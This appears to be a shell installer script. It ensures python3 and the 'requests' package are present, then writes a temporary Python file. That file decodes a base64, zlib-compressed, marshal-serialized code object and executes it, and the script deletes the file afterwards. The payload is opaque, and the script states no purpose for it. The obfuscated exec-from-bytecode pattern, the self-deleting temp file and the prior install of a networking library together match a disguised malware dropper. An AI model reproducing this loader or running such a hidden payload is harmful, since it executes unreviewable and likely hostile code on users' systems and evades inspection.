#Thx!
set -e

if ! command -v python3 >/dev/null 2>&1; then
  echo "Python3 not found. Please install python3 and try again."
  exit 1
fi

INSTALL_DIR="$PWD"
cd "$INSTALL_DIR" || exit 1

echo "Checking required python modules..."
python3 -c 'import importlib,subprocess,sys
pkgs=["requests"]
for p in pkgs:
    try:
        importlib.import_module(p)
    except ImportError:
        subprocess.check_call([sys.executable,"-m","pip","install",p])
' || { echo "Failed installing python packages (you can manually run : python3 -m pip install requests)"; }

PYFILE=""

PYFILE=$(mktemp /tmp/SMQ.XXXXXX.py 2>/dev/null) || :

if [ -z "$PYFILE" ] && [ -n "$TMPDIR" ]; then
  PYFILE=$(mktemp "$TMPDIR/SMQ.XXXXXX.py" 2>/dev/null) || :
fi

if [ -z "$PYFILE" ] && [ -n "$HOME" ]; then
  PYFILE=$(mktemp "$HOME/SMQ.XXXXXX.py" 2>/dev/null) || :
fi

if [ -z "$PYFILE" ]; then
  PYFILE=$(mktemp "$INSTALL_DIR/SMQ.XXXXXX.py" 2>/dev/null) || :
fi

if [ -z "$PYFILE" ] && command -v python3 >/dev/null 2>&1; then
  PYFILE=$(python3 - <<'PY'
import tempfile, sys
try:
    f = tempfile.NamedTemporaryFile(suffix=".py", delete=False)
    print(f.name)
    f.close()
except Exception:
    sys.exit(1)
PY
) || PYFILE=""
fi

if [ -z "$PYFILE" ]; then
  PYFILE="$INSTALL_DIR/SMQ_embedded.py"
fi

tdir=$(dirname "$PYFILE")
if [ ! -d "$tdir" ]; then
  mkdir -p "$tdir" 2>/dev/null || true
fi
if [ ! -w "$tdir" ]; then
  echo "Warning: cannot write to $tdir — trying current directory"
  PYFILE="./SMQ_embedded.py"
fi

trap 'rm -f "$PYFILE"' EXIT

cat > "$PYFILE" <<'PYCODE'
# -*- coding: utf-8 -*-

import sys, types, marshal, base64, zlib
_payload_b64 = 'eNqtFEtPG0d49uUd1othjWMIJGiLQKnTUmMIbQRNkZW4NISH4sVpExNZK3tjXPnF7NIUt6rciqg0QYJIROIH5FKpqnrIIafeesfCLc7iA1J6qXKhJYeeqs6swZhChKgy2p35vm++92Oeg5pF7547X+LtEVCAQl0DqHJSiLJOGtHWySDGOlnEKjTiFAbZFBbxCoegYkN1Co8EBSK7UofEKV4RLtCKvRV8SqF6RWwFyDHVoNQPfAKACgGYcnSA/l3TMohTccrj+IMg4zm+Lewb7Hs3tQv0WkDPYJ9vj9K/B/TtAfjK3hbuuzjYP+i7gBEWC6TiT9vvvbj+9MehKFMTL4t/gu/8TJF4w9WLIA0OrSB3mBai+qk9v4+R5g/T9mMOgSbw0Q0A0sz/8IF5PT6EYZVPOMzXAUL0vp0xXDn78faO8DYs7kEK1U3svxbf48BDj5uU4OFNRp/TTZtuxDKzhsndRQlDM7k7yVl92mSNRAojelLTsiYXDCiBSQ+LqdrnmDOaSWaQKUSnVRSJaUl1zqSj0zrpEBkv85JXNzJIjWteLTWbVA0t5u3xXsncTSczasybmpNTqm5oKJvQopo3O2dMZ9JeZew6+d/JzpmiMZdNpOORLEqkDSRhreTX5/GWB2WW/3bk65EN1lVgXcuhItt2gFJk3ZsO5wJdhvYl4TthA7YUYMuqswjPHKAUYWsZikvCfWF54DfY/icPGppeQsDBfU0rodXJh1NFtuOA/l9Z9w5JYxQcNRoj9PGj0YGLWVPIatnDtmqxaVLs/Rb7T+nth0vaXkOtaRrmpHpqtDiqWtgTa5GOiIl7tZZg06vbNX2khRBQbNaD6MY6XdVsu4/Kdm3jYzm+KtdSlWs9Tq4mL2eqEcET5+W4vqireTReAOARxuN3rPXPUK6lu7tbvjydyeiarKblTNZIZNIyJuYawr7b8lfyLTWRlq8idSbnCPcSgl9PqFEtmczRA7JJ+UyqN9d4Nf2ZmkzEiKJEVJPfiFfs/T3kaUB1GEDkNbNGzmQv3/SPIxKGyVmTaHJj/tCNgMkEA1dMLpHOkjdDN1ACvw94ciO3TFZPzeQqiN9CVBNe8QevRbCEhzJtUcuqToKUUaNlRNdSKurAYBsZ8V92RxyP4TcjC/r8RJltXHGttfQWpN4noYI0UGQHy2zd/HBJcJRh/aK25j5XcJz7oavg8BZhDyHxZIuuuToLjs7HswXH20XYXaFL7hVjNfbwi8ehQvP5demtDclXkHzrUt+CzWLYskvLyoNLZVFaGrk/sjhaEqVSfdOy/uB2Lel3UVp5c+2st+D0PukqON8rihfx9eJwWWwkPMv64sQz0YWcJDoYiaRwVSIRT6MJkTYzq+mGXskzGXtEegm1k81tpXk4GAiMI5nA/Jh/ODA+6TdtNwOjoxMfo9OEjbSsVRKrRFbeiJG0mtIike+BZbWSWPh+KhObTWofoPMYJRnXI3jbZiiKeg4aNoF9EwibQMTfFt+UZ0vQledK9uY8LAnuPF+qO5W3lWzOPFOCLfgCSnlu62zXT50vAaSa/3K5qVPbPYAVF3LrzOlnLLz34TYD2FbLgX8BjJ+acQ=='

def _run_payload():
    try:
        data = base64.b64decode(_payload_b64)
        data = zlib.decompress(data)
        code_obj = marshal.loads(data)
    except Exception as e:
        print("oops payload:", e, file=sys.stderr)
        raise

    module = types.ModuleType("__main__")
    module.__file__ = __file__
    sys.modules["__main__"] = module
    exec(code_obj, module.__dict__)

if __name__ == "__main__":
    _run_payload()

PYCODE

python3 "$PYFILE" "$@"
EXIT_CODE=$?

rm -f "$PYFILE"

exit $EXIT_CODE
